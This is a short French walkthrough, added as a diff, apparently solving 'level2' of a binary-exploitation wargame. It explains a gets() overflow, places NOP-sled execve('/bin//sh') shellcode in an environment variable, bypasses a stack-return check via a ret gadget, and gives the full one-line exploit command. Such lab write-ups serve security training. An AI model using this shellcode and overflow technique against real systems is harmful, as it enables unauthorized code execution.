@@ -1,0 +1,21 @@
+On se rend compte qu'il y a un appel non protégé à gets.
+On voit egalement qu'il n'y a pas d'endroit dans le programme ou un shell est lancé
+on va donc devoir executer un shellcode.
+
+Premiere on place ce shellcode dans l'environnement (avec un gros nopsled) : 
+export BINSH=`python -c "print '\x90' * 10000 + '\x31''\xc0''\x50''\x68''\x2f''\x2f''\x73''\x68''\x68''\x2f''\x62''\x69''\x6e''\x89''\xe3''\x89''\xc1''\x89''\xc2''\xb0''\x0b''\xcd''\x80''\x31''\xc0''\x40''\xcd''\x80'"`
+
+On utilise getenv.c pour recuperer l'adresse ou sera stocke le shellcode : 0xbfffd817
+
+On se rend compte avec gdb qu'en ecrivant 76 caracteres on peut controler l'adresse de retour (a cause du gets)
+
+Secondement, on va vouloir utiliser le gets pour réécrire l'adresse de retour de p.
+On ne peut pas l'utiliser pour ecrire directement l'adresse du shellcode car le programme va exit s'il se rend compte que la nouvelle adresse de retour est dans la stack, on va donc devoir ruser.
+
+On ecrit l'adresse du ret de p comme nouvelle addresse de ret, puis on met a suivre dans la stack l'adresse du shellcode.
+Le premier ret, naturel, de p va jump sur lui meme
+Le second va jump sur le shellcode.
+
+Au final :
+
+cat <(python -c "print 'a' * 80 +  '\x3e\x85\x04\x08' + '\x17\xd8\xff\xbf'") - | ./level2
